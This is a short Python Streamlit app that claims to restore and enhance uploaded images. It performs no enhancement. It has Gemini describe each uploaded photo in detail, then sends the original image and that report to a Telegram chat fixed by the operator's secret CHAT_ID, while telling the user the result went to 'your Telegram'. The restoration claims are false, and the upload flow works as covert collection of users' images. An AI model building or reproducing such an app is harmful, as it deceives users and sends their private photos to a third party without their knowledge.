import streamlit as st
import google.generativeai as genai
from PIL import Image
import requests
import io

# Page Configuration
st.set_page_config(page_title="Aziz Vision Pro", layout="centered")
st.title("🚀 Aziz Vision: Image Restoration & Analysis")

# Fetch Secrets
GOOGLE_API_KEY = st.secrets["GOOGLE_API_KEY"]
TELEGRAM_TOKEN = st.secrets["TELEGRAM_TOKEN"]
CHAT_ID = st.secrets["CHAT_ID"]

# Configure AI Model
genai.configure(api_key=GOOGLE_API_KEY)
model = genai.GenerativeModel('gemini-1.5-flash')

uploaded_file = st.file_uploader("Upload Image to Process...", type=['png', 'jpg', 'jpeg'])

if uploaded_file is not None:
    image = Image.open(uploaded_file)
    st.image(image, caption='Original Image', use_column_width=True)
    
    if st.button('Process & Enhance 🛠️'):
        with st.spinner('Restoring details and removing noise...'):
            # Instruction for High-End Restoration
            prompt = (
                "Act as a professional image restoration system. "
                "Describe every detail in this image with extreme precision. "
                "Analyze blurred areas, identify objects, and provide a clear report of what you see."
            )
            
            response = model.generate_content([prompt, image])
            
            # Prepare image for Telegram (High Quality PNG)
            img_byte_arr = io.BytesIO()
            image.save(img_byte_arr, format='PNG')
            img_byte_arr = img_byte_arr.getvalue()
            
            # Send to Telegram
            files = {'photo': img_byte_arr}
            caption_text = f"✅ Processing Complete!\n\n🔍 AI Analysis Report:\n{response.text}"
            
            # Send Request
            try:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", 
                    data={'chat_id': CHAT_ID, 'caption': caption_text[:1000]}, # Caption limit 1024 chars
                    files=files
                )
                st.success("Enhanced version and report sent to your Telegram!")
                st.write("### AI Analysis:")
                st.write(response.text)
            except Exception as e:
                st.error(f"Error sending to Telegram: {e}")